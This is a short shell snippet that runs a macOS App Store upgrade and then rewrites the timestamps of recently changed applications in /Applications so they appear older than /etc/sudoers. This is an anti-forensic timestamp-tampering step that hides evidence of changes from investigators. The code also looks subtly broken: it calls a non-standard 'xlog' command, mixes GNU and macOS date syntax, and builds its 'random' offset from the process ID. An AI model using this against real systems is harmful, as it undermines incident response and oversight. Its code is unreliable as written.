TS=$(date +%S%M)
SF=/etc/sudoers
d0=$(date -r $SF)
RANDOM_SECONDS=$$${TS}
command -v mas &>/dev/null && mas upgrade
find /Applications -maxdepth 1 -newer $SF -exec xlog touch -d "$(date -d "$d0 - $RANDOM_SECONDS seconds")" {} \; 2>/dev/null
